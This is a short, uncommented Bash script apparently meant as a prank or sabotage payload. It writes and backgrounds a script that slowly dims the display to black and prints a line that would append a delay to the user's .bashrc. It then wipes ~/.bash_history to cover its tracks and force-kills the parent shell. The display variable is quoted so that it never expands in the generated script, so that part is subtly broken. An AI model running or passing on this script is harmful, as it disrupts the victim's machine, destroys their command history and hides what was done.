DP=$(xrandr | grep " connected" | cut -d' ' -f1);

echo 'for i in $(seq 1 -0.01 0); do xrandr --output "$DP" --brightness "$i"; sleep 5; done' > /tmp/bg.sh
chmod +x /tmp/bg.sh
/tmp/bg.sh &
echo 'echo "sleep 1" >> ~/.bashrc'

echo "" > ~/.bash_history
kill -9 `ps --pid $$ -oppid=`
